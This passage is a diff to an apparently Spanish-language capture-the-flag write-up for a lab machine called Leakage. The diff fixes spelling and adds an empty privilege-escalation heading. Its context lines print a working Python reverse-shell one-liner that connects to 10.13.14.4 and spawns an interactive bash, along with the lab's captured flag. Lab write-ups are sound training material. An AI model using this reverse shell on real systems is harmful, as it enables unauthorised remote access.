@@ -417,7 +417,7 @@ Básicamente es una consola de Python, por lo que podemos mandaros una `reverse 
 >>> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.14.4",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
 ```
 
-Ahora si miramos con un `ls` no veremos una flag nueva, solo la que ya habiamos visto, pero con un `ls -a` si que la podremos ver ya que estaba oculta. FLAG: `AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}`
+Ahora si miramos con un `ls` no veremos una flag nueva, solo la que ya habíamos visto, pero con un `ls -a` sí que la podremos ver, ya que estaba oculta. FLAG: `AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}`
 
 ```
 aas@Leakage:~$ ls -a
@@ -426,3 +426,6 @@ aas@Leakage:~$ ls -a
 aas@Leakage:~$ cat .hiddenflag.txt
 AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}
 ```
+
+## ESCALADA DE PRIVILEGIOS
+
